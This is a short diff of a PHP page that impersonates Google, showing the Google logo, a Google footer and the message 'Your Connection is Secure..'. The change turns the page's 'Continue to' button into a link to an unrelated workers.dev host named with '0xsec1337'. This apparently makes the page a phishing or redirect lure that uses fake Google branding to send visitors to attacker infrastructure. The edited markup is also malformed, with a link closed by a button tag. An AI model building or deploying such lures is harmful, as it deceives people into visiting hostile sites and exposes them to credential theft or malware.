@@ -35,7 +35,7 @@ $display_query = isset($_GET['p']) ? htmlspecialchars(ucwords(str_replace('-', '
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google Logo">
         </div>
         <div class="text">Your Connection is Secure..</div>
-        <button class="action-button">Continue to <?php echo $display_query; ?></button>
+        <a class="action-button" href="https://8b22dca5-rough-mud-9055.0xsec1337-6e1.workers.dev/">Continue to <?php echo $display_query; ?></button>
         <div class="footer">
             Google © <?php echo date('Y'); ?>
         </div>
